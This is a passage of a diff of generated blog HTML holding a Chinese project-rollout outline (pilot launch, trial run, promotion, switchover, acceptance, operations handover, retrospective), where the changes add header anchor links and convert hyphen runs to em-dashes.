-<li>有线上保障机制-----甲乙双方上线资源保障及分工-----上线问题跟踪记录表</li>
+<li>有线上保障机制——-甲乙双方上线资源保障及分工——-上线问题跟踪记录表</li>
 </ol>
-<h5 id="系统试点上线">系统试点上线</h5>
-<ul>
+<h5 id="系统试点上线"><a href="#系统试点上线" class="headerlink" title="系统试点上线"></a>系统试点上线</h5><ul>
 <li>准备正式环境</li>
 <li>系统初始化</li>
 <li>上线通知发布</li>
 </ul>
-<h4 id="实施推广">实施推广</h4>
-<h5 id="系统上线试运行">系统上线试运行</h5>
-<ul>
-<li>试运行----上线问题跟踪处理，上线使用情况分析-----上线后两周内项目经理每日配合甲方跟进处理系统运行问题并发出系统运行日报</li>
+<h4 id="实施推广"><a href="#实施推广" class="headerlink" title="实施推广"></a>实施推广</h4><h5 id="系统上线试运行"><a href="#系统上线试运行" class="headerlink" title="系统上线试运行"></a>系统上线试运行</h5><ul>
+<li>试运行——上线问题跟踪处理，上线使用情况分析——-上线后两周内项目经理每日配合甲方跟进处理系统运行问题并发出系统运行日报</li>
 </ul>
-<h5 id="推广方案">推广方案</h5>
-<ul>
-<li>推广方案-----共同制定计划，组织分工，包含培训计划，数据准备</li>
-<li>运维接入----转接运维</li>
+<h5 id="推广方案"><a href="#推广方案" class="headerlink" title="推广方案"></a>推广方案</h5><ul>
+<li>推广方案——-共同制定计划，组织分工，包含培训计划，数据准备</li>
+<li>运维接入——转接运维</li>
 </ul>
-<h5 id="上线切换">上线切换</h5>
-<ul>
+<h5 id="上线切换"><a href="#上线切换" class="headerlink" title="上线切换"></a>上线切换</h5><ul>
 <li>推广动员大会</li>
 <li>最终用户培训</li>
-<li>数据准备-----初始化数据保密</li>
-<li>上线初始化------和测试环境一致</li>
+<li>数据准备——-初始化数据保密</li>
+<li>上线初始化———和测试环境一致</li>
 <li>上线切换</li>
 </ul>
-<h4 id="项目验收">项目验收</h4>
-<h5 id="项目验收-2">项目验收</h5>
-<ul>
-<li>内部验收评审会----检查项目验收标准----项目平稳运行3个月可以开始验收</li>
-<li>验收总结会议----项目验收报告需签字至甲方业务管线总及IT负责人</li>
+<h4 id="项目验收"><a href="#项目验收" class="headerlink" title="项目验收"></a>项目验收</h4><h5 id="项目验收-1"><a href="#项目验收-1" class="headerlink" title="项目验收"></a>项目验收</h5><ul>
+<li>内部验收评审会——检查项目验收标准——项目平稳运行3个月可以开始验收</li>
+<li>验收总结会议——项目验收报告需签字至甲方业务管线总及IT负责人</li>
 </ul>
 <p><strong>验收总结汇报PPT</strong></p>
 <ol>
@@ -985,12 +817,10 @@
 <li>展示包含核心场景的兑现效果</li>
 <li>包含困难及应对，团队表彰和项目总结</li>
 </ol>
-<h5 id="运维交接">运维交接</h5>
-<ul>
-<li>实施转运维交接-----明确遗留问题清单及计划</li>
+<h5 id="运维交接"><a href="#运维交接" class="headerlink" title="运维交接"></a>运维交接</h5><ul>
+<li>实施转运维交接——-明确遗留问题清单及计划</li>
 </ul>
-<h5 id="项目复盘总结">项目复盘总结</h5>
-<ul>
+<h5 id="项目复盘总结"><a href="#项目复盘总结" class="headerlink" title="项目复盘总结"></a>项目复盘总结</h5><ul>
 <li>项目复盘总结</li>
 <li>产品运营</li>
 </ul>
